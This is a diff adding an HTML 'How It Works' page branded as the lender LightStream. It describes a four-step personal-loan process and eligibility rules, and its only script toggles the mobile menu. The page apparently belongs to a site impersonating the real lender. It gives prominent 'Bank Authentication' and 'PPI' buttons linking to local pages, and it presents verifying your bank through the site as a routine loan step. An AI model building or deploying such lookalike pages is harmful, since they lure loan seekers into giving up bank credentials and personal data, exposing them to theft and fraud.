@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>How It Works - LightStream</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+            min-height: 100vh;
+        }
+        .glass-effect {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .neon-glow {
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5), 0 0 40px rgba(255, 215, 0, 0.3);
+        }
+        .text-cool {
+            color: #ffa500;
+        }
+        .cool-button {
+            background: linear-gradient(45deg, #000000, #333333);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .cool-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
+        }
+        .cool-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.5s;
+        }
+        .cool-button:hover::before {
+            left: 100%;
+        }
+        .bg-cool {
+            background: rgba(0, 0, 0, 0.7);
+            border-color: #ffa500;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+        .bg-cool-card {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-black">
+    <!-- Header Navigation -->
+    <header class="glass-effect sticky top-0 z-50">
+        <nav class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-8">
+                <div class="flex items-center space-x-2">
+                    <!-- Professional Logo -->
+                    <div class="relative">
+                        <img src="images/logo.png" alt="LightStream Logo" class="w-12 h-12 object-contain rounded-lg shadow-lg neon-glow">
+                        <div class="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></div>
+                    </div>
+                    <div class="text-2xl font-bold text-white">
+                        <span class="text-cool">LightStream</span>
+                    </div>
+                </div>
+                    <div class="hidden md:flex space-x-6">
+                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                        <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
+                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    </div>
+                </div>
+                <div class="hidden md:flex space-x-4">
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
+                </div>
+                <button class="md:hidden text-white" id="mobileMenuBtn">
+                    <i class="fas fa-bars text-2xl"></i>
+                </button>
+            </div>
+            <!-- Mobile Menu -->
+            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
+                <div class="flex flex-col space-y-3">
+                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
+                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="py-20">
+        <div class="container mx-auto px-4">
+            <div class="text-center">
+                <h1 class="text-4xl font-bold text-white mb-6">How It Works</h1>
+                <p class="text-xl text-gray-300 max-w-3xl mx-auto">
+                    Getting a personal loan with LightStream is simple, fast, and secure. Follow our easy 4-step process to get the funds you need.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Process Steps -->
+    <section class="py-20">
+        <div class="container mx-auto px-4">
+            <div class="grid md:grid-cols-4 gap-8">
+                <!-- Step 1 -->
+                <div class="text-center">
+                    <div class="bg-cool-card rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6 border border-cool">
+                        <span class="text-2xl font-bold text-cool">1</span>
+                    </div>
+                    <h3 class="text-xl font-semibold text-white mb-4">Apply Online</h3>
+                    <p class="text-gray-300">Fill out our secure online application form. It takes just 10-15 minutes to complete.</p>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="text-center">
+                    <div class="bg-cool-card rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6 border border-cool">
+                        <span class="text-2xl font-bold text-cool">2</span>
+                    </div>
+                    <h3 class="text-xl font-semibold text-white mb-4">Get Approved</h3>
+                    <p class="text-gray-300">Receive a decision within 24 hours. We'll review your application and credit profile.</p>
+                </div>
+
+                <!-- Step 3 -->
+                <div class="text-center">
+                    <div class="bg-cool-card rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6 border border-cool">
+                        <span class="text-2xl font-bold text-cool">3</span>
+                    </div>
+                    <h3 class="text-xl font-semibold text-white mb-4">Bank Authentication</h3>
+                    <p class="text-gray-300">Securely verify your bank account for fast fund transfer and identity verification.</p>
+                </div>
+
+                <!-- Step 4 -->
+                <div class="text-center">
+                    <div class="bg-cool-card rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6 border border-cool">
+                        <span class="text-2xl font-bold text-cool">4</span>
+                    </div>
+                    <h3 class="text-xl font-semibold text-white mb-4">Receive Funds</h3>
+                    <p class="text-gray-300">Get your money deposited directly into your bank account within 1-3 business days.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Detailed Process -->
+    <section class="py-20">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-white text-center mb-12">Detailed Process Overview</h2>
+
+            <div class="space-y-12">
+                <!-- Application Details -->
+                <div class="bg-cool-card rounded-lg p-8 border border-cool">
+                    <div class="flex items-start space-x-6">
+                        <div class="bg-cool text-white rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0">
+                            <i class="fas fa-edit"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-xl font-semibold text-white mb-4">Step 1: Complete Your Application</h3>
+                            <p class="text-gray-300 mb-4">Our online application is designed to be quick and easy. You'll need to provide:</p>
+                            <ul class="text-gray-300 space-y-2">
+                                <li><i class="fas fa-check text-cool mr-2"></i>Personal information (name, address, contact details)</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Employment and income details</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Loan amount and purpose</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Bank account information for fund transfer</li>
+                            </ul>
+                            <p class="text-gray-300 mt-4">The entire process takes about 10-15 minutes and can be completed from any device.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Approval Details -->
+                <div class="bg-cool-card rounded-lg p-8 border border-cool">
+                    <div class="flex items-start space-x-6">
+                        <div class="bg-cool text-white rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-xl font-semibold text-white mb-4">Step 2: Quick Approval Process</h3>
+                            <p class="text-gray-300 mb-4">Once you submit your application:</p>
+                            <ul class="text-gray-300 space-y-2">
+                                <li><i class="fas fa-check text-cool mr-2"></i>We review your credit profile and application details</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>You receive a decision within 24 hours (often much faster)</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>If approved, you'll see your loan terms and interest rate</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>You can accept or decline the offer - no obligation</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bank Authentication Details -->
+                <div class="bg-cool-card rounded-lg p-8 border border-cool">
+                    <div class="flex items-start space-x-6">
+                        <div class="bg-cool text-white rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-xl font-semibold text-white mb-4">Step 3: Secure Bank Authentication</h3>
+                            <p class="text-gray-300 mb-4">For security and fast processing:</p>
+                            <ul class="text-gray-300 space-y-2">
+                                <li><i class="fas fa-check text-cool mr-2"></i>Verify your identity through your bank's secure system</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Confirm your bank account for fund transfer</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Process takes just a few minutes</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Your information is encrypted and secure</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Fund Transfer Details -->
+                <div class="bg-cool-card rounded-lg p-8 border border-cool">
+                    <div class="flex items-start space-x-6">
+                        <div class="bg-cool text-white rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0">
+                            <i class="fas fa-money-bill-wave"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-xl font-semibold text-white mb-4">Step 4: Receive Your Funds</h3>
+                            <p class="text-gray-300 mb-4">Once everything is approved:</p>
+                            <ul class="text-gray-300 space-y-2">
+                                <li><i class="fas fa-check text-cool mr-2"></i>Funds are deposited directly into your verified bank account</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Typically arrives within 1-3 business days</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>You'll receive email confirmation when funds are sent</li>
+                                <li><i class="fas fa-check text-cool mr-2"></i>Start using your money for your intended purpose</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Requirements Section -->
+    <section class="py-20">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <h2 class="text-3xl font-bold text-white mb-4">What You'll Need</h2>
+                <p class="text-gray-300 text-lg">Have these documents ready to speed up your application</p>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-8">
+                <div class="bg-cool-card rounded-lg p-8 border border-cool">
+                    <h3 class="text-xl font-semibold text-white mb-6">Required Information</h3>
+                    <ul class="text-gray-300 space-y-3">
+                        <li><i class="fas fa-user text-cool mr-3"></i>Valid government-issued ID</li>
+                        <li><i class="fas fa-envelope text-cool mr-3"></i>Active email address</li>
+                        <li><i class="fas fa-phone text-cool mr-3"></i>Phone number</li>
+                        <li><i class="fas fa-home text-cool mr-3"></i>Proof of residence</li>
+                        <li><i class="fas fa-briefcase text-cool mr-3"></i>Employment information</li>
+                        <li><i class="fas fa-dollar-sign text-cool mr-3"></i>Income verification</li>
+                    </ul>
+                </div>
+
+                <div class="bg-cool-card rounded-lg p-8 border border-cool">
+                    <h3 class="text-xl font-semibold text-white mb-6">Eligibility Requirements</h3>
+                    <ul class="text-gray-300 space-y-3">
+                        <li><i class="fas fa-calendar text-cool mr-3"></i>Must be 18 years or older</li>
+                        <li><i class="fas fa-flag-usa text-cool mr-3"></i>U.S. citizen or permanent resident</li>
+                        <li><i class="fas fa-credit-card text-cool mr-3"></i>Valid bank account</li>
+                        <li><i class="fas fa-chart-line text-cool mr-3"></i>Minimum credit score of 660</li>
+                        <li><i class="fas fa-money-check text-cool mr-3"></i>Regular income source</li>
+                        <li><i class="fas fa-shield-alt text-cool mr-3"></i>Good credit history</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-20">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-3xl font-bold text-white mb-4">Ready to Get Started?</h2>
+            <p class="text-gray-300 text-lg mb-8">Join thousands of satisfied customers who trust LightStream for their financial needs</p>
+            <div class="space-x-4">
+                <a href="personal-loans.html" class="inline-block bg-cool text-white py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition duration-200">
+                    Apply for Your Loan Today
+                </a>
+                <a href="faqs.html" class="inline-block border border-cool text-cool py-3 px-8 rounded-lg font-semibold hover:bg-cool hover:text-black transition duration-200">
+                    Learn More
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="glass-effect border-t border-gray-700">
+        <div class="container mx-auto px-4 py-8">
+            <div class="text-center">
+                <p class="text-gray-400"> 2024 LightStream. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Wait for DOM to be fully loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            // Mobile menu toggle (matching personal-loans.html)
+            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+            const mobileMenu = document.getElementById('mobileMenu');
+
+            if (mobileMenuBtn && mobileMenu) {
+                mobileMenuBtn.addEventListener('click', () => {
+                    mobileMenu.classList.toggle('hidden');
+                });
+            }
+        });
+    </script>
+</body>
+</html>
